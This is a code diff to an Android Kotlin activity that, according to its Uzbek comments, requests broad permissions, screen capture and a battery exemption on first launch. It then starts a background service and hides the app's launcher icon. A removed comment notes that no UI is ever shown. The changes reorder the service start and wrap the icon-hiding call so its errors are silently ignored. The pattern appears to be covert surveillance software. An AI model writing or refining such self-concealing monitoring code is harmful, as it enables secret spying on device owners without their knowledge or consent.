@@ -14,8 +14,7 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 
 /**
- * Birinchi ochilishda: barcha ruxsatlar → ekran ruxsati → batareya → yashirish.
- * Hech qanday UI ko'rinmaydi.
+ * Birinchi ochilishda: ruxsatlar → ekran → batareya → service → yashirish.
  */
 class BootstrapActivity : AppCompatActivity() {
     private var step = 0
@@ -55,9 +54,9 @@ class BootstrapActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        HullasService.start(this)
 
         if (Prefs.isInitialized(this)) {
+            HullasService.start(this)
             finishSilent()
             return
         }
@@ -109,21 +108,24 @@ class BootstrapActivity : AppCompatActivity() {
 
     private fun completeSetup() {
         Prefs.setInitialized(this)
+        HullasService.start(this)
         finishSilent()
     }
 
     private fun finishSilent() {
-        HullasService.start(this)
         hideLauncher()
         moveTaskToBack(true)
         finish()
     }
 
     private fun hideLauncher() {
-        packageManager.setComponentEnabledSetting(
-            ComponentName(this, BootstrapActivity::class.java),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP,
-        )
+        try {
+            packageManager.setComponentEnabledSetting(
+                ComponentName(this, BootstrapActivity::class.java),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP,
+            )
+        } catch (_: Exception) {
+        }
     }
 }
